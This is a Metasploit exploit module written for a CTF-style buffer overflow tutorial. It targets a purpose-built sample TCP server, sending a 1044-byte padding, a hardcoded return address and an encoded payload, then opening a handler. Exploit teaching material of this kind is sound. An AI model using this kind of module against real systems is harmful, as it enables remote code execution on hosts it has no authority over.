##
# This module requires Metasploit
# This is a simple exploit module developed for an article at
# http://taishi8117.github.io
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'bof_lab TCP server exploit',
      'Description'    => %q|
        This is a module for exploiting a buffer overflow on a sample TCP server 
        for the article Exploiting Simple Buffer Overflow (3) on Sirius CTF
      |,
      'Author'         => 'Sirius CTF',
      'References'     =>
        [
          [ 'URL', 'http://taishi8117.github.io' ],
        ],
      'Platform'       => 'linux',
      'Payload'        =>
        {
        },
      'Arch'          => [ARCH_X86],
      'Targets'        => 
        [
          [
            'Linux x86',
            {
              'Arch' => ARCH_X86,
              'Ret'      => 0xffffcfe0
            }
          ]
        ],
      'DefaultTarget'  => 0
    ))
  end


  # Returns that the remote host is always vulnerable
  def check
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    connect

    print_status("Sending #{payload.encoded.length} byte payload...")

    # Build the buffer for transmission
    buf = "A" * 1044
    buf += [ target.ret ].pack('V')
    buf += payload.encoded

    # Send it off
    sock.put(buf)
    sock.get

    handler
  end
end
